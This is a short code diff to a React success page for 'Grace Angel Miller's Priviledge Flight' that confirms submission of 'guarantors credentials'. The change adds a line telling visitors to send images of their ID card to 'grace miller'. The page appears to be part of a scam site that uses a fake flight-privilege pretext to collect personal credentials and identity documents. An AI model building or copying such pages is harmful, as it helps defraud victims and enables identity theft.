@@ -11,7 +11,7 @@ function Success() {
                     <h1>Grace Angel Miller's Priviledge Flight <br />
                     Guarantors Credential Submitted: <br />
                     <span>Successfully</span></h1>
-                    <p>Check back within 24hours for result</p>
+                    <p>Check back within 24hours for result, and provide images of ID card to grace miller for confirmation</p>
                     <p className="red">application will be rejected if gaurantors details does not match our system or is incorrect</p>
                 </div>
 
